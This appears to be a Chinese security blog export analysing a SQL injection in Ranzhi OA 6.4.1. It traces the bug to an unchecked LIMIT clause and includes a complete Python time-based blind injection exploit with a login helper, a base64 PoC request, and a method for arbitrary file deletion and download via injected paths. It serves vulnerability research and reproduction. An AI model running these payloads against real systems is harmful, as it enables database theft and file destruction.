<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521125830898qbruppn9.png" alt="paste image"></p>
<p>在  <code>information_schema</code>   中的 <code>tables</code> 表里面存放着整个 <code>mysql</code> 里面保存的表的信息， <code>table_schema</code> 为 表所在的数据库， <code>table_name</code> 为表名。</p>
<p>所以使用 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT table_name FROM information_schema.tables where table_schema=database()</div></pre></td></tr></table></figure>
<p>就可以得到 当前数据库的 所有表的表名（<code>database()</code> 返回当前的数据库名称）。</p>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521125872094xdfxknzu.png" alt="paste image"></p>
<p>由于没有回显，需要使用一些 <code>条件判断</code> 相关的函数，这里我使用 <code>if</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select if(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables where table_schema=database() LIMIT 0,1) ,1 ,1))=16, SLEEP(3), 1)</div></pre></td></tr></table></figure>
<p><code>if</code> 的第一参数为 <code>1</code> 则返回第二个参数的值，否则返回 第3个参数的值.</p>
<p>上面的语句用到了子查询和 <code>acsii</code>， <code>substr</code> 来对检索到的结果根据其 <code>ascii</code> 值进行枚举，如果枚举到了，就 <code>sleep(3)</code>。</p>
<p>我们可以通过判断服务器的响应时间，来判断当前枚举位的具体值。</p>
<p>同时子查询只允许返回一行，所以使用 了 <code>limit 0,1</code> 来只返回第一条结果。</p>
<p>枚举表名的关键代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">table_name = &quot;&quot;</div><div class="line">for i in range(1, table_len + 1):</div><div class="line">    for j in range(1, 129):</div><div class="line">        payload = get_payload_encode(</div><div class="line">            &apos;&apos;&apos;select if(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables where table_schema=database() LIMIT 0,1) ,&#123;&#125; ,1))=&#123;&#125;, SLEEP(3), 1);&apos;&apos;&apos;.format(</div><div class="line">                i, j))</div><div class="line"></div><div class="line">        start = time.time()</div><div class="line">        requests.get(host)</div><div class="line">        nor_time = (time.time() - start)</div><div class="line"></div><div class="line">        start = time.time()</div><div class="line">        requests.get(target + payload.decode(&quot;utf-8&quot;), headers=headers, cookies=cookies)</div><div class="line">        att_time = (time.time() - start)</div><div class="line">        if att_time - nor_time &gt; 2:</div><div class="line">            table_name += chr(j)</div><div class="line">            print(table_name)</div><div class="line">            break</div></pre></td></tr></table></figure>
<p>还有一个注意的就是，程序过滤了 <code>_</code>, 这里使用 <code>prepare</code> 和 <code>execute</code> 组合进行绕过，因为 <code>mysql</code> 支持字符串使用 <code>16</code> 进制编码输入。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">def get_payload_encode(payload):</div><div class="line">    sql = &quot;set @query=0x&#123;&#125;;prepare stmt from @query;execute stmt;&quot;.format(binascii.b2a_hex(payload.encode(&quot;utf-8&quot;)).decode(&quot;utf-8&quot;))</div><div class="line">    raw = &#123;&quot;orderBy&quot;: &quot;id limit 0,1;&#123;&#125;#&quot;.format(sql)&#125;</div><div class="line">    raw = json.dumps(raw)</div><div class="line">    return base64.b64encode(raw.encode(&quot;utf-8&quot;))  # str---&gt; byte   用 encode</div></pre></td></tr></table></figure>
<p>最后的 <code>exp</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div></pre></td><td class="code"><pre><div class="line"># coding=utf-8</div><div class="line">import requests</div><div class="line">import base64</div><div class="line">import time</div><div class="line">import json</div><div class="line">import binascii</div><div class="line">import re</div><div class="line">import hashlib</div><div class="line">import chardet</div><div class="line"></div><div class="line"></div><div class="line">def get_md5(input):</div><div class="line">    input = input.encode(&quot;utf-8&quot;)</div><div class="line">    m = hashlib.md5()</div><div class="line">    m.update(input)</div><div class="line">    return m.hexdigest()</div><div class="line"></div><div class="line">def get_payload_encode(payload):</div><div class="line">    sql = &quot;set @query=0x&#123;&#125;;prepare stmt from @query;execute stmt;&quot;.format(binascii.b2a_hex(payload.encode(&quot;utf-8&quot;)).decode(&quot;utf-8&quot;))</div><div class="line">    raw = &#123;&quot;orderBy&quot;: &quot;id limit 0,1;&#123;&#125;#&quot;.format(sql)&#125;</div><div class="line">    raw = json.dumps(raw)</div><div class="line">    return base64.b64encode(raw.encode(&quot;utf-8&quot;))  # str---&gt; byte   用 encode</div><div class="line"></div><div class="line"></div><div class="line"># get_db_name(host)</div><div class="line"></div><div class="line"></div><div class="line">def get_table_name(host):</div><div class="line">    path = &quot;/cash/block-printTradeBlock.html?param=&quot;</div><div class="line">    target = host + path</div><div class="line">    # 查表名</div><div class="line">    table_len = 0</div><div class="line">    for i in range(1, 100):</div><div class="line">        payload = get_payload_encode(</div><div class="line">            &apos;&apos;&apos;select if((SELECT LENGTH(table_name)FROM information_schema.tables where table_schema=database() LIMIT 0,1)=&#123;&#125;, SLEEP(3), 1);&apos;&apos;&apos;.format(</div><div class="line">                i))</div><div class="line">        start = time.time()</div><div class="line">        requests.get(host)</div><div class="line">        nor_time = (time.time() - start)</div><div class="line"></div><div class="line">        start = time.time()</div><div class="line">        requests.get(target + payload.decode(&quot;utf-8&quot;), headers=headers, cookies=cookies)</div><div class="line">        att_time = (time.time() - start)</div><div class="line"></div><div class="line">        if att_time - nor_time &gt; 2:</div><div class="line">            table_len = i</div><div class="line">            break</div><div class="line"></div><div class="line"></div><div class="line">    print(&quot;db_len: %d&quot; %(table_len))</div><div class="line"></div><div class="line">    table_name = &quot;&quot;</div><div class="line">    for i in range(1, table_len + 1):</div><div class="line">        for j in range(1, 129):</div><div class="line">            payload = get_payload_encode(</div><div class="line">                &apos;&apos;&apos;select if(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables where table_schema=database() LIMIT 0,1) ,&#123;&#125; ,1))=&#123;&#125;, SLEEP(3), 1);&apos;&apos;&apos;.format(</div><div class="line">                    i, j))</div><div class="line"></div><div class="line">            start = time.time()</div><div class="line">            requests.get(host)</div><div class="line">            nor_time = (time.time() - start)</div><div class="line"></div><div class="line">            start = time.time()</div><div class="line">            requests.get(target + payload.decode(&quot;utf-8&quot;), headers=headers, cookies=cookies)</div><div class="line">            att_time = (time.time() - start)</div><div class="line">            if att_time - nor_time &gt; 2:</div><div class="line">                table_name += chr(j)</div><div class="line">                print(table_name)</div><div class="line">                break</div><div class="line"></div><div class="line"></div><div class="line">def login(url, username , password):</div><div class="line">    target = url + &quot;/sys/user-login.html&quot;</div><div class="line">    data = &#123;&quot;account&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;d4dba0bc2f7e946feaeacbdcdc167131&quot;,</div><div class="line">                  &quot;referer&quot;: &quot;http://hack.ranzhi.top/sys/index.html&quot;, &quot;rawPassword&quot;: &quot;21232f297a57a5a743894a0e4a801fc3&quot;,</div><div class="line">                  &quot;keepLogin&quot;: &quot;false&quot;&#125;</div><div class="line"></div><div class="line">    res = requests.get(target, headers=headers)</div><div class="line">    cookies[&apos;rid&apos;] = res.cookies[&apos;rid&apos;]</div><div class="line">    random = re.findall(&apos;v\.random = &quot;(.*?)&quot;;&apos;, res.text)[0]</div><div class="line"></div><div class="line">    # 生成登录需要的数据</div><div class="line">    data[&apos;account&apos;] = username</div><div class="line">    data[&apos;referer&apos;] = target</div><div class="line">    data[&apos;rawPassword&apos;] = get_md5(password)</div><div class="line">    data[&apos;password&apos;] = get_md5(get_md5(get_md5(password) + username) + random)</div><div class="line"></div><div class="line">    res = requests.post(target, headers=headers, cookies=cookies, data=data)</div><div class="line">    if &quot;self.location&quot; in res.content.decode(&quot;utf-8&quot;):</div><div class="line">        print(&quot;登录成功，下面开始 exploit&quot;)</div><div class="line">    else:</div><div class="line">        print(&quot;登录失败&quot;)</div><div class="line">        exit(0)</div><div class="line"></div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    proxies = &#123;&quot;http&quot;: &quot;http://127.0.0.1:8080&quot;, &quot;https&quot;: &quot;https://127.0.0.1:8080&quot;, &#125;</div><div class="line"></div><div class="line">    cookies = &#123;&quot;lang&quot;: &quot;zh-cn&quot;, &quot;theme&quot;: &quot;default&quot;, &quot;keepLogin&quot;: &quot;false&quot;, &quot;rid&quot;: &quot;6n6panbh36uqiqj4k5o0nbscq2&quot;,</div><div class="line">               &quot; XDEBUG_SESSION&quot;: &quot;19857&quot;&#125;</div><div class="line">    headers = &#123;&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,</div><div class="line">               &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36&quot;,</div><div class="line">               &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;,</div><div class="line">               &quot;Referer&quot;: &quot;http://hack.ranzhi.top/sys/index.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,</div><div class="line">               &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;, &quot;Connection&quot;: &quot;close&quot;&#125;</div><div class="line"></div><div class="line">    host = &quot;http://hack.ranzhi.top:80/&quot;</div><div class="line">    # get_table_name(host)</div><div class="line"></div><div class="line">    login(host, &quot;test&quot;, &quot;111111&quot;)</div><div class="line">    get_table_name(host)</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 渗透测试 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> sqli </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[然之协同系统6.4.1 SQL注入导致getshell]]></title>
      <url>/2018/03/12/ranzhi_oa_6_4_1_sqli_to_getshell.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>先知上一个大佬挖的洞，也有了简单的分析</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://xianzhi.aliyun.com/forum/topic/2135</div></pre></td></tr></table></figure>
<p>我自己复现分析过程，漏洞的原理比较简单，但是漏洞的利用方式对我而言则是一种新的利用方式。本文对分析过程做一个记录。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h5 id="分析软件运行的流程"><a href="#分析软件运行的流程" class="headerlink" title="分析软件运行的流程"></a>分析软件运行的流程</h5><p>拿到一个需要分析的 <code>php</code> 程序，首先看看客户端的 <code>http</code> 请求是如何对应到程序中的代码的。</p>
<p>首先得找一个分析的开始点，就以 触发漏洞 的 请求为示例把。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">GET /cash/block-printTradeBlock.html?param=eyJvcmRlckJ5IjoiaWQgbGltaXQgMCwxO3NlbGVjdCBpZigxPTIsMSxzbGVlcCgyKSkjIiB9 HTTP/1.1</div><div class="line">Host: hack.ranzhi.top</div><div class="line">Pragma: no-cache</div><div class="line">Cache-Control: no-cache</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.9</div><div class="line">Cookie: PHPSESSID=2c17fafndhnfle6j4r9dskopk3; lang=zh-cn; theme=default; rid=kcvhkos22q574sqdjiha39icl5; keepLogin=false; XDEBUG_SESSION=14822</div><div class="line">Connection: close</div></pre></td></tr></table></figure>
<p>安装系统时我们设置 <code>www</code> 目录为虚拟主机目录， 所以当我们访问 <code>/cash/block-printTradeBlock.html</code>  时，实际上访问的是 <code>www/cash/block-printTradeBlock.html</code>， 但是 <code>cash</code> 目录中并没有相关的文件</p>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/15211243155329vwlf1i6.png" alt="paste image"></p>
<p>不过该目录下有 <code>.htaccess</code> 文件，通过该文件可以重写 <code>url</code>, 根据规则我们知道，如果访问 <code>cash</code> 目录下不存在的文件，会把请求交给 <code>index.php</code> 处理。</p>
<p><code>.htaccess</code> 文件参考</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://t.cn/REFVyCJ</div><div class="line">https://www.zybuluo.com/phper/note/73726</div></pre></td></tr></table></figure>
<p>那下面就分析 <code>index.php</code> 即可，下好断点，然后发送数据包</p>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521124995566vuspzewd.png" alt="paste image"><br><code>f7</code> 跟进 <code>loader.php</code>, 首先加载了一些基础类。</p>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521125044351mjyaf5jo.png" alt="paste image"></p>
<p>然后做一些初始化的操作，实例化一些基础对象，后面用来加载程序的主体</p>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521125084147z5px74tw.png" alt="paste image"></p>
<p>然后是设置路由方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$app-&gt;parseRequest();</div></pre></td></tr></table></figure></p>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521125118839tdf4kut9.png" alt="paste image"></p>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/15211251899328gi7e9rd.png" alt="paste image"></p>
<p>会对 处理后 <code>url</code> 按 <code>-</code> 分割，第一项作为 <code>module_name</code> 第二项作为 <code>method_name</code>. 以上面的数据包为例。执行完后的结果如下。</p>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521125273630jpgg0ctv.png" alt="paste image"></p>
<p>此时我们已经设置好了 模块名 和 方法名，  下面回到 <code>loader.php</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$common-&gt;checkPriv();  # 权限校验</div><div class="line">$app-&gt;loadModule();		#  加载相关模块的方法</div></pre></td></tr></table></figure>
<p>进入 <code>loadModule</code> 方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">public function loadModule()</div><div class="line">  &#123;</div><div class="line">      $appName    = $this-&gt;appName;</div><div class="line">      $moduleName = $this-&gt;moduleName;</div><div class="line">      $methodName = $this-&gt;methodName;</div><div class="line"></div><div class="line">      </div><div class="line">      /*</div><div class="line">       * 设置control的类名。</div><div class="line">       * Set the class name of the control.</div><div class="line">       **/</div><div class="line">      $className = class_exists(&quot;my$moduleName&quot;) ? &quot;my$moduleName&quot; : $moduleName;</div><div class="line"></div><div class="line">      /*</div><div class="line">       * 创建control类的实例。</div><div class="line">       * 根据 `$app-&gt;parseRequest()` 设置好的 模块名 实例化对应的类</div><div class="line">       * Create a instance of the control.</div><div class="line">       **/</div><div class="line">      $module = new $className();</div><div class="line">      $this-&gt;control = $module;</div><div class="line"></div><div class="line">      /* </div><div class="line">       * 使用反射机制获取函数参数的默认值</div><div class="line">       * 通过反射获取 函数的参数名称，</div><div class="line">       * 通过 `php` 的反射机制 ， 获取参数名， 并且初始化好</div><div class="line">       *</div><div class="line">       * */</div><div class="line">      $defaultParams = array();</div><div class="line">      $methodReflect = new reflectionMethod($className, $methodName);</div><div class="line">      foreach($methodReflect-&gt;getParameters() as $param)</div><div class="line">      &#123;</div><div class="line">          $name = $param-&gt;getName();</div><div class="line"></div><div class="line">          $default = &apos;_NOT_SET&apos;;</div><div class="line">          if(isset($paramDefaultValue[$appName][$className][$methodName][$name]))</div><div class="line">          &#123;</div><div class="line">              $default = $paramDefaultValue[$appName][$className][$methodName][$name];</div><div class="line">          &#125;</div><div class="line">          elseif(isset($paramDefaultValue[$className][$methodName][$name]))</div><div class="line">          &#123;</div><div class="line">              $default = $paramDefaultValue[$className][$methodName][$name];</div><div class="line">          &#125;</div><div class="line">          elseif($param-&gt;isDefaultValueAvailable())</div><div class="line">          &#123;</div><div class="line">              $default = $param-&gt;getDefaultValue();</div><div class="line">          &#125;</div><div class="line"></div><div class="line">          $defaultParams[$name] = $default; # 组成一个由 defaultParams[参数名] = &quot;&quot; 构成的字典</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      /** </div><div class="line">       * 根据PATH_INFO或者GET方式设置请求的参数。</div><div class="line">         * 根据请求方式， 从请求数据包中获取需要的参数信息。</div><div class="line">       */</div><div class="line">      if($this-&gt;config-&gt;requestType != &apos;GET&apos;)</div><div class="line">      &#123;</div><div class="line">          $this-&gt;setParamsByPathInfo($defaultParams);</div><div class="line">      &#125;</div><div class="line">      else</div><div class="line">      &#123;</div><div class="line">          $this-&gt;setParamsByGET($defaultParams);</div><div class="line">      &#125;</div><div class="line">	</div><div class="line">        # 过滤数据</div><div class="line">        if($this-&gt;config-&gt;framework-&gt;filterParam == 2)</div><div class="line">      &#123;</div><div class="line">          $_GET     = validater::filterParam($_GET, &apos;get&apos;);</div><div class="line">          $_COOKIE  = validater::filterParam($_COOKIE, &apos;cookie&apos;);</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      /* 调用方法，并传入参数 */</div><div class="line">      call_user_func_array(array($module, $methodName), $this-&gt;params);</div><div class="line">      return $module;</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
<p>该函数的流程为</p>
<ul>
<li>根据 <code>$app-&gt;parseRequest()</code> 设置好的 模块名 实例化对应的类</li>
<li>通过 <code>php</code> 的反射机制 ， 获取方法参数名， 并且初始化好</li>
<li>根据请求方式， 从请求包中获取需要的参数信息到 <code>$defaultParams</code> 。</li>
<li>过滤数据</li>
<li>调用方法，并传入参数<br>看一看设置参数的方式</li>
</ul>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521125306380g6cjyk94.png" alt="paste image"></p>
<p>按照 <code>-</code>  分割 <code>url</code>格式为 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">module_name-method_name-param1-param2</div></pre></td></tr></table></figure>
<p>所以在该程序中 <code>www</code> 和 <code>app</code> 目录是相互对应的。</p>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521125349171r94zdqju.png" alt="paste image"></p>
<p>当我们请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/dir_name/module_name-method_name-param-...-paramN.html</div></pre></td></tr></table></figure>
<p>最后会调用 <code>app</code> 目录下 <code>module_name</code> 中的 <code>control.php</code> 的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">module_name-&gt;method_name(param1,....,paramN)</div></pre></td></tr></table></figure>
<p>比如 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/cash/block-printTradeBlock.html</div></pre></td></tr></table></figure>
<p>实际就是调用  <code>app</code> 目录下 <code>cash</code> 中的 <code>control.php</code> 的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">block-&gt;printTradeBlock()</div></pre></td></tr></table></figure>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521125395253bn6iq2w0.png" alt="paste image"></p>
<h5 id="SQL-注入分析"><a href="#SQL-注入分析" class="headerlink" title="SQL 注入分析"></a>SQL 注入分析</h5><p>漏洞出现在 <code>lib/base/dao/dao.class.php</code></p>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521125447188qwjt71bi.png" alt="paste image"></p>
<p>这里只对 <code>$order</code> 部分进行了校验， 而没有对 <code>limit</code> 后面的部分进行校验。</p>
<p>看到 <code>printTradeBlock</code></p>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521125494026llldsutj.png" alt="paste image"></p>
<p>在 <code>$this-&gt;processParams()</code> 中设置好 <code>$this-&gt;params</code></p>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521125522792ytwt07my.png" alt="paste image"></p>
<p>可以看到 <code>$this-&gt;params</code> 就是 <code>json_decode(base64_decode($_GET[&#39;param&#39;]))</code></p>
<p>然后又会调用 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">orderBy($this-&gt;params-&gt;orderBy)</div></pre></td></tr></table></figure>
<p>所以我们可以控制 <code>limit</code> 后面的部分， <strong>SQL注入</strong>。</p>
<p>这套程序中还会执行 <code>sql</code> 语句,用的是 <code>Pdo</code>用的是 <code>$pdo-&gt;query()</code>, 这个函数可以一次执行多条 <code>sql</code> 语句。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">/**</div><div class="line">   * 执行SQL语句，返回PDOStatement结果集。</div><div class="line">   * Query the sql, return the statement object.</div><div class="line">   * </div><div class="line">   * @access public</div><div class="line">   * @return object   the PDOStatement object.</div><div class="line">   */</div><div class="line">  public function query($sql = &apos;&apos;)</div><div class="line">  &#123;</div><div class="line">      /* 如果有错误，返回一个空的PDOStatement对象，确保后续方法能够执行。*/</div><div class="line">      /* If any error, return an empty statement object to make sure the remain method to execute. */</div><div class="line">      if(!empty(dao::$errors)) return new PDOStatement();   </div><div class="line"></div><div class="line">      if($sql)</div><div class="line">      &#123;</div><div class="line">          $sql       = trim($sql);</div><div class="line">          $sqlMethod = strtolower(substr($sql, 0, strpos($sql, &apos; &apos;)));</div><div class="line">          $this-&gt;setMethod($sqlMethod);</div><div class="line">          $this-&gt;sqlobj = new sql();</div><div class="line">          $this-&gt;sqlobj-&gt;sql = $sql;</div><div class="line">      &#125;</div><div class="line">      else</div><div class="line">      &#123;</div><div class="line">          $sql = $this-&gt;processSQL(); // 大概就是获取 sql 语句</div><div class="line">      &#125;</div><div class="line">      $key = md5($sql);</div><div class="line"></div><div class="line">      try</div><div class="line">      &#123;</div><div class="line">          $method = $this-&gt;method;</div><div class="line">          $this-&gt;reset();</div><div class="line"></div><div class="line">          if($this-&gt;slaveDBH and $method == &apos;select&apos;)</div><div class="line">          &#123;</div><div class="line">              if(isset(dao::$cache[$key])) return dao::$cache[$key];</div><div class="line">              $result = $this-&gt;slaveDBH-&gt;query($sql);</div><div class="line">              dao::$cache[$key] = $result;</div><div class="line">              return $result;</div><div class="line">          &#125;</div><div class="line">          else</div><div class="line">          &#123;</div><div class="line">              if($this-&gt;method == &apos;select&apos;)</div><div class="line">              &#123;</div><div class="line">                  if(isset(dao::$cache[$key])) return dao::$cache[$key];</div><div class="line">                  $result = $this-&gt;slaveDBH-&gt;query($sql);</div><div class="line">                  dao::$cache[$key] = $result;</div><div class="line">                  return $result;</div><div class="line">              &#125;</div><div class="line"></div><div class="line">              return $this-&gt;dbh-&gt;query($sql);</div><div class="line">          &#125;</div><div class="line">      &#125;</div><div class="line">      catch (PDOException $e) </div><div class="line">      &#123;</div><div class="line">          $this-&gt;sqlError($e);</div><div class="line">      &#125;</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p>
<p>这样我们的利用方式就简单了。</p>
<ul>
<li>闭合 limit 语句，用 <code>;</code>  连接多条语句</li>
<li>没有回显， 使用 时间盲注</li>
</ul>
<p><code>poc</code></p>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521125571122zsfb7duz.png" alt="paste image"></p>
<h5 id="任意文件下载-amp-amp-任意文件删除"><a href="#任意文件下载-amp-amp-任意文件删除" class="headerlink" title="任意文件下载 &amp;&amp; 任意文件删除"></a>任意文件下载 &amp;&amp; 任意文件删除</h5><p>由于可以一次执行多条 <code>sql</code> 语句 ，我们实质上已经可以控制数据库了。</p>
<p>在 <code>app/sys/file/control.php</code> ,有两个函数  <code>delete</code> 和 <code>download</code>, 分别用于删除文件和下载文件。</p>
<p>以  <code>delete</code> 为例<br><img src="http://oh1jgyw0v.bkt.clouddn.com/1521125580680gq019szd.png" alt="paste image"></p>
<p><code>$this-&gt;file-&gt;getById($fileID)</code>  时间就是在 <code>表前缀sys_file</code> 中查找对应 <code>id</code> 相对应的 路径。</p>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521125632630vqnycj5d.png" alt="paste image"></p>
<p>利用 <code>sql</code> 注入修改为目标路径（用 <code>../</code> 进行目录跳转），然后选择相应 <code>id</code> 即可删除指定文件。下载文件也是类似。</p>
